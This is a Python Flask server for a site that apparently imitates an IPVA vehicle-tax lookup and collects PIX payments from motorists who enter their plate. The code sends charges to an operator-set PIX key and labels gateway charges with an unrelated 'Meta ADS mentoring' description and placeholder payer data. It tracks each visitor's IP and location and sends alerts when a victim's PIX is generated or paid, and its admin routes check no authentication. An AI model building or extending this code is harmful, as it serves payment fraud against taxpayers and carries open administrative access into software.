from flask import Flask, request, jsonify, send_file, send_from_directory
import json
import os
from datetime import datetime
from plate_calculator import calculate_ipva_data
from pix_utils import generate_pix_payload
from config import PIX_KEY, PIX_NAME, PIX_CITY, PIX_DESCRIPTION
import admin_data_manager as adm
import admin_auth
from session_tracker import tracker
import meta_pixel
import uuid
from order_manager import order_manager
import database

# Initialize Database
database.init_db()

app = Flask(__name__, static_folder='.', static_url_path='')

# Serve HTML pages
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin.html')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/admin_new.html')
def admin_new():
    return send_from_directory('.', 'admin_new.html')

@app.route('/resultado.html')
def resultado():
    return send_from_directory('.', 'resultado.html')

# API Endpoints
@app.route('/api/admin/stats')
def get_admin_stats():
    try:
        stats = adm.get_stats()
        return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/config', methods=['GET', 'POST'])
def admin_config():
    if request.method == 'GET':
        try:
            config = adm.get_config()
            return jsonify(config)
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    else:
        try:
            data = request.json
            adm.save_config(data.get('pix_key'), data.get('pix_name'), data.get('pix_city'))
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

@app.route('/api/get_pixel_code')
def get_pixel_code():
    try:
        pixel_code = meta_pixel.get_pixel_code()
        return pixel_code, 200, {'Content-Type': 'text/html'}
    except Exception as e:
        return str(e), 500

@app.route('/api/admin/get_pixel_config')
def get_pixel_config():
    try:
        config = meta_pixel.get_pixel_config()
        return jsonify(config)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/get_orders')
def get_orders():
    try:
        orders = order_manager.get_all_orders()
        stats = order_manager.get_stats()
        return jsonify({"orders": orders, "stats": stats})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/delete_orders', methods=['POST'])
def delete_orders():
    try:
        data = request.json
        order_ids = data.get('order_ids', [])
        if not order_ids:
            return jsonify({"error": "No order IDs provided"}), 400
            
        success = order_manager.delete_orders(order_ids)
        return jsonify({"success": success})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/delete_all_orders', methods=['POST'])
def delete_all_orders():
    try:
        success = order_manager.delete_all_orders()
        return jsonify({"success": success})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/get_sessions')
def get_sessions():
    try:
        return jsonify({
            "online_users": tracker.get_online_users(),
            "stats": tracker.get_stats()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/health')
def health_check():
    print("DEBUG: Health check called", flush=True)
    return jsonify({"status": "ok", "message": "Server is running"}), 200

@app.route('/api/server_ip')
def get_server_ip():
    """Retorna o IP público do servidor Railway para whitelist no proxy"""
    try:
        import requests
        # Usa serviço externo para descobrir o IP público
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip_data = response.json()
        return jsonify({
            "server_ip": ip_data.get('ip'),
            "message": "Use este IP para autorizar no painel do proxy"
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/calculate_ipva', methods=['POST'])
def calculate_ipva():
    print("=" * 50, flush=True)
    print("DEBUG: Received request for /api/calculate_ipva", flush=True)
    print("=" * 50, flush=True)
    import time
    start_time = time.time()
    status = "Erro desconhecido"
    renavam = None
    plate = None
    try:
        data = request.json
        plate = data.get('plate')
        renavam = plate if plate and plate.isdigit() and len(plate) == 11 else None # Initial guess
        print(f"DEBUG: Processing plate: {plate}", flush=True)
        
        if not plate:
            print("DEBUG: No plate provided, returning error", flush=True)
            status = "Erro: Placa não fornecida"
            return jsonify({"error": "Plate required"}), 400
        
        print(f"DEBUG: About to call calculate_ipva_data for plate: {plate}", flush=True)
        result = calculate_ipva_data(plate)
        print(f"DEBUG: calculate_ipva_data returned: {type(result)}", flush=True)
        
        if 'error' not in result:
            status = "Sucesso"
            # Extract definitive renavam from result if available
            if result.get('renavam'):
                renavam = result.get('renavam')
                
            adm.log_consulta(
                result.get('plate', plate),
                result.get('brand', 'Unknown'),
                result.get('ipva_full', 'R$ 0,00')
            )
            
            session_id = str(uuid.uuid4())
            
            # Calculate duration
            duration_ms = int((time.time() - start_time) * 1000)
            
            order = order_manager.create_order(
                session_id=session_id,
                vehicle_data=result,
                payment_data={
                    'ipva_full': result.get('ipva_full'),
                    'ipva_discounted': result.get('ipva_discounted'),
                    'licensing_val': result.get('licensing_val'),
                    'installment_val': result.get('installment_val'),
                    'first_payment_total': result.get('first_payment_total')
                },
                renavam=renavam,
                status=status,
                duration_ms=duration_ms
            )
            
            result['session_id'] = session_id
            result['order_id'] = order['order_id']
        
        # Log error cases (where result has error key)
        if 'error' in result:
            status = f"Erro: {result.get('message', result.get('error'))}"
            # Even if error, we might want to log it? Currently create_order is only called on success.
            # User wants to visualize ALL requests status. 
            # We should probably create an order/log even for errors?
            # For now, following the flow: only successful data creates an "order" (which is displayed in admin)
            # BUT user asked to see "if success and return data".
            # To show errors in the "Pedidos" table, we would need to create an order entry marked as failed.
            
            # Let's create an order entry even for errors to show in the table
            session_id = str(uuid.uuid4()) # Generate ID for logging purpose
            duration_ms = int((time.time() - start_time) * 1000)
            
            order_manager.create_order(
                session_id=session_id,
                vehicle_data={'plate': plate, 'brand': 'Erro na busca', 'model': '-', 'year': '-'},
                payment_data={},
                renavam=renavam or plate, # Show input as renavam if unavailable
                status=status,
                duration_ms=duration_ms,
                is_error=True
            )

        return jsonify(result)
    except Exception as e:
        status = f"Erro Exception: {str(e)}"
        duration_ms = int((time.time() - start_time) * 1000)
        # Log exception case
        try:
             order_manager.create_order(
                session_id=str(uuid.uuid4()),
                vehicle_data={'plate': plate or 'Unknown', 'brand': 'Erro Crítico', 'model': '-', 'year': '-'},
                payment_data={},
                renavam=renavam,
                status=status,
                duration_ms=duration_ms,
                is_error=True
            )
        except:
            pass
        return jsonify({"error": str(e)}), 500

@app.route('/api/generate_pix', methods=['POST'])
def generate_pix():
    try:
        data = request.json
        amount = float(data.get('amount'))
        plate = data.get('plate', 'Unknown')
        session_id = data.get('session_id')
        
        if not amount:
            return jsonify({"error": "Amount required"}), 400
        
        # Check for existing PIX for this session + plate
        if session_id and plate:
            existing_pix = order_manager.get_pix_by_session_and_plate(session_id, plate)
            if existing_pix:
                print(f"Reusing existing PIX for session {session_id}, plate {plate}", flush=True)
                return jsonify({
                    "payload": existing_pix['pix_code'],
                    "method": "reused",
                    "order_id": existing_pix['order_id'],
                    "message": "PIX já gerado anteriormente para esta placa"
                })
        
        # Check amount limit for Axis gateway (max R$ 490)
        AXIS_MAX_AMOUNT = 490.00
        use_axis = amount <= AXIS_MAX_AMOUNT
        
        if amount > AXIS_MAX_AMOUNT:
            print(f"INFO: Amount R$ {amount:.2f} exceeds Axis limit (R$ {AXIS_MAX_AMOUNT:.2f}), using manual PIX", flush=True)
        
        # Try Axis gateway first if enabled AND amount is within limit
        import axis_gateway
        if use_axis and axis_gateway.is_axis_enabled():
            print(f"INFO: Using Axis gateway for PIX generation (R$ {amount:.2f})", flush=True)
            
            # Get customer data from session/order
            # Get customer data from session/order
            raw_cpf = str(data.get('cpf', ''))
            # Remove non-digits
            import re
            spf_digits = re.sub(r'\D', '', raw_cpf)
            
            # If masked (contains less than 11 digits due to *) or invalid, use default
            # Assuming Axis accepts 00000000000 for generic/unidentified payer
            final_cpf = spf_digits if len(spf_digits) == 11 else '00000000000'
            
            customer_data = {
                'name': data.get('name', 'Serviço Digital Pro'),
                'email': data.get('email', 'cliente@example.com'),
                'cpf': final_cpf,
                'phone': data.get('phone', '00000000000')
            }
            
            axis_result = axis_gateway.generate_axis_pix(
                name=customer_data['name'],
                email=customer_data['email'],
                cpf=customer_data['cpf'],
                phone=customer_data['phone'],
                amount=amount,
                description="Mentoria Meta ADS Descomplicado 2026",
                external_id=session_id or f"order_{plate}_{int(datetime.now().timestamp())}",
                plate=plate
            )
            
            if axis_result['success']:
                pix_code = axis_result['pix_code']
                adm.log_pix(plate, f"R$ {amount:.2f}", pix_code)
                
                if session_id:
                    order_manager.mark_pix_generated(session_id, pix_code)
                
                # Send Pushcut notification
                try:
                    import pushcut_notifier
                    pushcut_notifier.send_pix_generated(plate, amount, pix_code)
                except Exception as e:
                    print(f"Error sending Pushcut notification: {e}", flush=True)
                
                return jsonify({
                    "payload": pix_code,
                    "qr_code": axis_result.get('qr_code', ''),
                    "transaction_id": axis_result.get('transaction_id', ''),
                    "method": "axis"
                })
            else:
                print(f"WARN: Axis failed, falling back to manual PIX: {axis_result.get('error')}", flush=True)
                # Continue to fallback below
        
        # Fallback to manual PIX generation
        print(f"INFO: Using manual PIX generation", flush=True)
        config = adm.get_config()
        pix_key = config.get('pix_key', PIX_KEY)
        pix_name = config.get('pix_name', PIX_NAME)
        pix_city = config.get('pix_city', PIX_CITY)
        
        name = pix_name[:25]
        city = pix_city[:15]
        
        pix_code = generate_pix_payload(pix_key, name, city, amount)
        
        adm.log_pix(plate, f"R$ {amount:.2f}", pix_code)
        
        if session_id:
            order_manager.mark_pix_generated(session_id, pix_code)
        
        # Send Pushcut notification
        try:
            import pushcut_notifier
            pushcut_notifier.send_pix_generated(plate, amount, pix_code)
        except Exception as e:
            print(f"Error sending Pushcut notification: {e}", flush=True)
        
        return jsonify({"payload": pix_code, "method": "manual"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    try:
        data = request.json
        if admin_auth.verify_login(data.get('username'), data.get('password')):
            token = admin_auth.create_session(data.get('username'))
            return jsonify({"token": token})
        else:
            return jsonify({"error": "Invalid credentials"}), 401
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def get_real_ip():
    """Get real IP address handling proxies and CloudFlare"""
    # Check for CloudFlare header
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    # Check for X-Forwarded-For (proxy)
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    # Check for X-Real-IP
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    # Fallback to remote_addr
    return request.remote_addr

def get_ip_location(ip):
    """Get city and state from IP using ipinfo.io (better reliability)"""
    try:
        # Skip localhost/private IPs
        if ip in ['127.0.0.1', 'localhost'] or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
            return {'city': 'Local', 'state': 'Local', 'country': 'BR'}
        
        import requests
        
        # Try ipinfo.io first (more reliable)
        try:
            response = requests.get(f'https://ipinfo.io/{ip}/json', timeout=3)
            if response.status_code == 200:
                data = response.json()
                city = data.get('city', 'Desconhecido')
                state = data.get('region', 'Desconhecido')
                
                if city != 'Desconhecido' or state != 'Desconhecido':
                    print(f"ipinfo.io: {city}, {state}", flush=True)
                    return {'city': city, 'state': state, 'country': data.get('country', 'BR')}
        except Exception as e:
            print(f"ipinfo.io failed: {e}", flush=True)
        
        # Fallback to ip-api.com
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,city,regionName,country', timeout=3)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    print(f"ip-api.com: {data.get('city')}, {data.get('regionName')}", flush=True)
                    return {'city': data.get('city', 'Desconhecido'), 'state': data.get('regionName', 'Desconhecido'), 'country': data.get('country', 'BR')}
        except Exception as e:
            print(f"ip-api.com failed: {e}", flush=True)
            
    except Exception as e:
        print(f"Error getting IP location: {e}", flush=True)
    
    return {'city': 'Desconhecido', 'state': 'Desconhecido', 'country': 'BR'}

@app.route('/api/track_session', methods=['POST'])
def track_session():
    try:
        data = request.json
        session_id = data.get('session_id') or str(uuid.uuid4())
        
        # Get real IP and location
        ip_address = get_real_ip()
        print(f"=== TRACK SESSION DEBUG ===", flush=True)
        print(f"Session ID: {session_id}", flush=True)
        print(f"IP Address: {ip_address}", flush=True)
        
        location = get_ip_location(ip_address)
        print(f"Location returned: {location}", flush=True)
        
        city = location.get('city')
        state = location.get('state')
        print(f"Calling tracker with city={city}, state={state}", flush=True)
        
        tracker.create_or_update_session(
            session_id, 
            data.get('stage'), 
            data.get('utm_source'),
            ip_address, 
            data.get('plate'),
            city=city,
            state=state
        )
        print(f"Session updated successfully", flush=True)
        print(f"===========================", flush=True)
        return jsonify({"session_id": session_id})
    except Exception as e:
        print(f"ERROR in track_session: {e}", flush=True)
        import traceback
        traceback.print_exc()
        return jsonify({"error": str(e)}), 500

@app.route('/api/track_pix_copy', methods=['POST'])
def track_pix_copy():
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if session_id:
            tracker.mark_pix_copied(session_id)
            order_manager.mark_pix_copied(session_id)
        
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_pixel', methods=['POST'])
def save_pixel():
    try:
        data = request.json
        meta_pixel.save_pixel_config(data.get('pixel_id'), data.get('enabled', True))
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# PIX Manual Configuration Endpoints
@app.route('/api/admin/get_config')
def get_config_endpoint():
    try:
        config = adm.get_config()
        return jsonify(config)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_config', methods=['POST'])
def save_config_endpoint():
    try:
        data = request.json
        adm.save_config(
            pix_key_type=data.get('pix_key_type', 'cpf'),
            pix_key=data.get('pix_key', ''),
            pix_name=data.get('pix_name', ''),
            pix_city=data.get('pix_city', '')
        )
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Pushcut Notifications Endpoints
@app.route('/api/admin/get_pushcut_config')
def get_pushcut_config():
    try:
        config = adm.get_config()
        return jsonify({"pushcut_enabled": config.get('pushcut_enabled', False)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_pushcut_config', methods=['POST'])
def save_pushcut_config():
    try:
        data = request.json
        adm.save_config(pushcut_enabled=data.get('pushcut_enabled', False))
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Axis Banking Gateway Endpoints
@app.route('/api/admin/get_axis_config')
def get_axis_config():
    try:
        import axis_gateway
        config = axis_gateway.get_axis_config()
        # Don't expose full API key in response
        if config.get('api_key'):
            config['api_key_masked'] = config['api_key'][:8] + '...' + config['api_key'][-4:]
        return jsonify(config)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_axis_config', methods=['POST'])
def save_axis_config():
    try:
        import axis_gateway
        data = request.json
        config = axis_gateway.save_axis_config(
            enabled=data.get('enabled', False),
            api_key=data.get('api_key', ''),
            postback_url=data.get('postback_url', '')
        )
        return jsonify({"success": True, "config": config})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/test_axis', methods=['POST'])
def test_axis():
    try:
        import axis_gateway
        result = axis_gateway.test_axis_connection()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/axis_webhook', methods=['POST'])
def axis_webhook():
    """Handle Axis payment notifications"""
    try:
        data = request.json
        print(f"INFO: Axis webhook received: {data}", flush=True)
        
        # Extract transaction data
        transaction_id = data.get('transactionId')
        external_id = data.get('externalId')
        status = data.get('status')
        
        # Update order status if payment confirmed
        if status == 'paid' or status == 'confirmed':
            # Send Pushcut notification
            try:
                import pushcut_notifier
                amount = data.get("amount", 0)
                plate = external_id.split("_")[1] if "_" in str(external_id) else "Unknown"
                pushcut_notifier.send_pix_paid(plate, amount, transaction_id)
            except Exception as e:
                print(f"Error sending Pushcut: {e}", flush=True)
            print(f"INFO: Payment confirmed for {external_id}", flush=True)
            # Here you can update order status in your system
            # order_manager.mark_as_paid(external_id, transaction_id)
        
        return jsonify({"success": True})
    except Exception as e:
        print(f"ERROR: Axis webhook failed: {e}", flush=True)
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    PORT = int(os.environ.get('PORT', 8080))
    print(f"=" * 60, flush=True)
    print(f"🚀 Starting IPVA Server on port {PORT}", flush=True)
    print(f"=" * 60, flush=True)
    app.run(host='0.0.0.0', port=PORT, debug=False)
else:
    # For Gunicorn (production)
    print("=" * 60, flush=True)
    print("🚀 IPVA Server loaded by Gunicorn", flush=True)
    print(f"Environment: {os.environ.get('RAILWAY_ENVIRONMENT', 'local')}", flush=True)
    print("=" * 60, flush=True)
